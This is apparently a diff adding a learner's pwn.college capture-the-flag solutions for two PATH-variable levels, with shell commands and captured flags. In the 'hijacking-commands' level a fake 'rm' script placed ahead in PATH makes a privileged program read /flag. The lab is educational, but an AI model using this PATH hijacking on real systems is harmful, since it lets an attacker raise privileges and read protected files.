@@ -18,3 +18,24 @@ Invoking 'win'....
 Congratulations! You properly set the flag and 'win' has launched!
 pwn.college{ESlUY6MjRF3dfYF3mDOiRhrsodc.dVzNyUDLyczN1czW}
 ```
+3-
+```
+hacker@path~adding-commands:~$ touch win
+hacker@path~adding-commands:~$ echo "cat /flag" > /home/hacker/win
+hacker@path~adding-commands:~$ PATH=$PATH:/home/hacker
+hacker@path~adding-commands:~$ chmod a+x /home/hacker/win
+hacker@path~adding-commands:~$ /challenge/run
+Invoking 'win'....
+pwn.college{Uf3JJkXb-Y6HK_SqTsTTTLhLpaw.dZzNyUDLyczN1czW}
+```
+4-
+```
+hacker@path~hijacking-commands:~$ touch rm
+hacker@path~hijacking-commands:~$ echo "cat /flag" > /home/hacker/rm
+hacker@path~hijacking-commands:~$ chmod a+x /home/hacker/rm
+hacker@path~hijacking-commands:~$ PATH=/home/hacker:$PATH
+hacker@path~hijacking-commands:~$ /challenge/run
+Trying to remove /flag...
+Found 'rm' command at /home/hacker/rm. Executing!
+pwn.college{gUX27uUXw5ji3hw1EnO8L8bGg8_.ddzNyUDLyczN1czW}
+```
